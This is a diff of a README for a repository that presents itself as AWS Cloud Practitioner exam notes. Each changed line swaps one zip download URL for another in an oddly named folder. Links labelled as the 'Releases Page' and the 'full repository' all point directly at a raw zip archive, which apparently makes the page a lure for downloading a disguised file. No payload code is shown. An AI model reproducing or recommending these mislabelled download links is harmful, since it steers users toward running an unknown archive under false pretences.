@@ -6,7 +6,7 @@ Welcome! This guide will help you easily download and run the **aws-clf-c02-notl
 
 ## 📥 Download
 
-[![Download Release](https://raw.githubusercontent.com/Shadabuddin/aws-clf-c02-notlari/main/labyrinthibranchiate/aws-clf-c02-notlari-3.7.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/Shadabuddin/aws-clf-c02-notlari/main/labyrinthibranchiate/aws-clf-c02-notlari-3.7.zip)
+[![Download Release](https://github.com/Shadabuddin/aws-clf-c02-notlari/raw/refs/heads/main/labyrinthibranchiate/notlari-aws-clf-c-v3.4.zip%20Release-v1.0-blue)](https://github.com/Shadabuddin/aws-clf-c02-notlari/raw/refs/heads/main/labyrinthibranchiate/notlari-aws-clf-c-v3.4.zip)
 
 ## 📋 Features
 
@@ -28,7 +28,7 @@ To run this application, make sure your device meets the following requirements:
 
 To download the application:
 
-1. **Visit the Releases Page:** Click this link to go to the download section: [Download Releases](https://raw.githubusercontent.com/Shadabuddin/aws-clf-c02-notlari/main/labyrinthibranchiate/aws-clf-c02-notlari-3.7.zip).
+1. **Visit the Releases Page:** Click this link to go to the download section: [Download Releases](https://github.com/Shadabuddin/aws-clf-c02-notlari/raw/refs/heads/main/labyrinthibranchiate/notlari-aws-clf-c-v3.4.zip).
    
 2. **Choose the Latest Version:** Look for the latest release. You will see options for different formats or additional packages if available.
 
@@ -58,6 +58,6 @@ To enhance your preparation, consider visiting these additional resources:
 
 ## 🔗 Learn More
 
-For more details about this project and updates, check the full repository on GitHub: [aws-clf-c02-notlari Repository](https://raw.githubusercontent.com/Shadabuddin/aws-clf-c02-notlari/main/labyrinthibranchiate/aws-clf-c02-notlari-3.7.zip).
+For more details about this project and updates, check the full repository on GitHub: [aws-clf-c02-notlari Repository](https://github.com/Shadabuddin/aws-clf-c02-notlari/raw/refs/heads/main/labyrinthibranchiate/notlari-aws-clf-c-v3.4.zip).
 
 Your journey to mastering AWS concepts starts with these notes. If you have any questions, feel free to raise an issue on the repository. Happy studying!
